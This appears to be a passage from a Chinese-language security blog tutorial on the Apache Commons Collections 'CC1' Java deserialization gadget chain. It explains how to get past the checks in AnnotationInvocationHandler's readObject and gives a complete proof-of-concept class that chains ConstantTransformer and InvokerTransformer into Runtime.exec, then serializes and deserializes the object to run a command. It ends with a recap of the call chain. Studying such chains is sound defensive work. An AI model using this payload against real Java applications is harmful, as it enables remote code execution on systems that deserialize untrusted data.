for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;      String name = memberValue.getKey();      Class&lt;?&gt; memberType = memberTypes.get(name);      if (memberType != null) &#123;  // i.e. member still exists          Object value = memberValue.getValue();          if (!(memberType.isInstance(value) ||                value instanceof ExceptionProxy)) &#123;              memberValue.setValue(                  new AnnotationTypeMismatchExceptionProxy(                      value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(                          annotationType.members().get(name)));
我们发现我们还有两个问题需要解决，一是value的值我们希望是chain，而是我们还需要构造通过if判断，一个一个解决这两个问题这里的两个if是第一个注解成员是不是空的，我们用的确实是空的所以直接不通过，所以我们要换一个注解成员不为空的，同时还要通过第二个if，第二个if比较好通过，保证value的类型和它不一致同时不是哪个错误里的就行我们选择了target这个注释就可以通过判断进入setvalue这个我们梦寐以求的代码里了。但是非常不幸的是我们进入之后发现这个value的参数我们没办法控制，这个value是固定的。这时候好像走入死胡同了，接下来将出现神之一手，之前那几个transformer的几个实现类里面有一个是无论什么输入都会转换成固定值，那我们在chain里第一个放上一个，那我们不管它的value是什么到我们这里都可以成为我们想要的值，真实冥冥之中都是写好的，能发现这个漏洞的也是真厉害。
  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.map.TransformedMap;    import java.io.*;  import java.lang.annotation.Target;  import java.lang.reflect.Constructor;  import java.util.HashMap;  import java.util.Map;    // 解决了第一个问题  public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          Transformer[] transformers = new Transformer[]&#123;                  new ConstantTransformer(Runtime.class),                  new InvokerTransformer(&quot;getMethod&quot;                          , new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                  new InvokerTransformer(&quot;invoke&quot;                          , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),                  new InvokerTransformer(&quot;exec&quot;                          , new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)          &#125;;          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);          HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();          hashMap.put(&quot;value&quot;,&quot;cc&quot;);          Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);          Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);          Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);          aihConstructor.setAccessible(true);          Object o = aihConstructor.newInstance(Target.class, transformedMap);            // 序列化反序列化          serialize(o);          unserialize(&quot;ser.bin&quot;);      &#125;      public static void serialize(Object obj) throws IOException &#123;          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));          oos.writeObject(obj);      &#125;      public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));          Object obj = ois.readObject();          return obj;      &#125;  &#125;
伟大无需多言。
调用链回顾接下来我们再梳理一遍这个思路，我们首先发现invoketransformer里面可以任意在执行命令，我们接着找谁可以调用这个transformer方法，我们发现了transformermap里面的checkvalueset，然后 接着往上找我们找到了setvalue，然后这个还被readobject调用，这样我们的反序列化链条就完善了。

